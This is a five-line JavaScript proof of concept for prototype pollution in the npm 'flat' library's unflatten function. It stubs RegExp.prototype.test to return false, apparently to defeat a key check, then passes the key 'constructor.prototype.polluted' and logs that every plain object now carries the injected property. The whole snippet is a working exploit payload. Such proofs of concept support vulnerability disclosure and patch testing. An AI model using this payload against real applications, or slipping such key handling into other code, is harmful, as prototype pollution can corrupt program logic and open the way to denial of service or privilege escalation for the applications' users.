RegExp.prototype.test = () => false;
var unflatten = require('flat').unflatten;
console.log({}.polluted);
unflatten({ 'constructor.prototype.polluted': 'yes' });
console.log({}.polluted);